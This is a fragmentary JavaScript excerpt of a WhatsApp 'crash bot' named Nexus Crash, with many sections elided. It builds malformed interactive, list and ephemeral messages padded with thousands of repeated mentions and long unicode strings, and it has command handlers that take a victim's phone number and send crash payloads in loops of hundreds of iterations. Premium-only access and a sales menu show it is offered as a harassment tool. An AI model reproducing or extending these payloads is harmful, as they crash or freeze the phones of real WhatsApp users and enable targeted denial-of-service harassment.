        ...
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    ...
                    body: {
                        text: "Nexus Crash 🐍 🐍 Is Back\n" + "@062598121203".repeat(17000)
                    },
                    nativeFlowMessage: {
                        buttons: [{
                            name: "cta_url",
                            buttonParamsJson: "{ display_text: 'Nexus Crash 🐍 🐍 Bot', url: \"https://whatsapp.com/channel/0029Vb68fVN8aKvQGRBqvy2e\", merchant_url: \"https://whatsapp.com/channel/0029Vb68fVN8aKvQGRBqvy2e\" }"
                        }, {
                            name: "call_permission_request",
                            buttonParamsJson: "{}"
                        }],
    ...
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          ...
          body: {
            text: 'Nexus Crash 🐍 🐍 Blank!' + Vampire + Private,
          },
          footer: {
            text: '',
          },
        ...
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    ...
                    body: {
                        text: "Nexus Crash 🐍 🐍 Bug" + Lalapo + Vampire
                    },
                    contextInfo: {
        ...
        await rikz.relayMessage(
            ...
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Nexus Crash 🐍 🐍 Here Bro" },
                        content: undefined
                    }
                ]
            }
...
description: "( Script Nexus Crash V3 )"
}
}
},
contextInfo: {
...
{
tag: "meta",
attrs: { is_status_mention: "🌀 *𝐍𝐄𝐗𝐔𝐒 𝐂𝐑𝐀𝐒𝐇" },
content: undefined
}
]
}
...
async function protocolbug3(target, mention) {
        ...
        await rikz.relayMessage(
            ...
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "⚠️ Nexus Crash V3" },
                        content: undefined
                    }
                ]
            }
  ...
  async function protocolbug5v2(isTarget, mention) {
    ...
    const embeddedMusic = {
        ...
        author: ".𝐍𝐄𝐗𝐔𝐒 𝐂𝐑𝐀𝐒𝐇" + longUnicode,
        title: "Nexuz Crash🐉〽️" + longUnicode,
                ...
                listResponseMessage: {
                    ...
                    contextInfo: {
                        ...
                        forwardedNewsletterMessageInfo: {
                            ...
                            serverMessageId: 1,
                            newsletterName: "Nexus? Come Heree!!!🐍〽"
                        }
                    },
                    description: "Nexus?? yess, sirrr!!!🐍〽"
                }
            }
        },
        contextInfo: {
          ...
          extendedTextMessage: {
            ...
            contextInfo: {
              ...
              quotedAd: {
                ...
                mediaType: "IMAGE",
                jpegThumbnail:
                  "https://img1.pixhost.to/images/6845/616553273_alizz.jpg",
                caption: " target ",
              },
              placeholderKey: {
              ...
              externalAdReply: {
                ...
                previewType: "VIDEO",
                thumbnail: "https://img1.pixhost.to/images/6845/616553273_alizz.jpg",
                sourceType: " target ",
                sourceId: " target ",
...
m.reply(`*[!] bug successfully sent to 𝚝𝚊𝚛𝚐𝚎𝚝,𝚝𝚎𝚛𝚐𝚝 𝚕𝚊𝚐𝚒 𝚍𝚎𝚕𝚊𝚢 abiz😹*`); 
...
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628���`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`*[!] bug successfully sent to 𝚝𝚊𝚛𝚐𝚎𝚝,𝚝𝚎𝚛𝚐𝚝 𝚕𝚊𝚐𝚒 𝚍𝚎𝚕𝚊𝚢 tuh😹*`); 
          for (let i = 0; i < 879; i++) {
...
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628×××`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`*[!] 𝚋𝚞𝚐 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢 𝚜𝚎𝚗𝚝 𝚝𝚘 𝚝𝚊𝚛𝚐𝚎𝚝*`); 
          for (let i = 0; i < 879; i++) {
            await bulldozer(target);
            await bulldozer(target);
            await bulldozer(target);
...
if (!isPremium) return m.reply('𝚕𝚞 𝚋𝚞𝚔𝚊𝚗 nexus kontol');  
    
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628���`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`*[!] bug successfully sent to 𝚝𝚊𝚛𝚐𝚎𝚝*`); 
          for (let i = 0; i < 879; i++) {
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
...
case "delayinvisible": case "delayleo": case "bullprot": {
if (!isCreator && isPremium) return m.reply(msg.owner);
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628×××`);
...
case "menu": {
let itsmenu = 
`こんにちは、私はマスターによって設計されたバグボットです。賢く使ってください。そうでなければ非常に致命的です。

╔⚍━ ⌜\`ɪɴғᴏʀᴍᴀᴛɪᴏɴ ʙᴏᴛ\` ⌟ ━⚎⪼
║儬 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : 𝚅𝙸𝙽𝚉 𝙾𝙵𝙵𝙸𝙲𝙸𝙰𝙻
║儬 𝙽𝙰𝙼𝙰 𝙱𝙾𝚃 : 𝙽𝙴𝚇𝚄𝚂 𝙲𝚁𝙰𝚂𝙷𝙴𝚁
║儬 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 3.2.0
║儬 𝚂𝚃𝙰𝚃𝚄𝚂 : 𝚅𝚅𝙸𝙿 𝙱𝚄𝚈 𝙾𝙽𝙻𝚈!! 
║儬 𝙰𝙲𝚃: https://ẉ.ceo/𝚅𝙸𝙽𝚉
╚⚍⚎⚍⚎⚍⚎⚍⚎⚍⚎⚍⚎⚎⚎⚍⚎⪼
...
➣ 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 𝗦𝗖𝗥𝗜𝗣𝗧 』
https://whatsapp.com/channel/0029Vb5cSz4002TFT4p5vp2w
> © 𝚅𝙸𝙽𝚉 𝙾𝙵𝙵𝙸𝙲𝙸𝙰𝙻`;
await rikz.sendMessage(m.chat, {
image: { url: "https://img1.pixhost.to/images/6845/616553273_alizz.jpg" },
caption: itsmenu
}, { quoted: m });
}
break; 
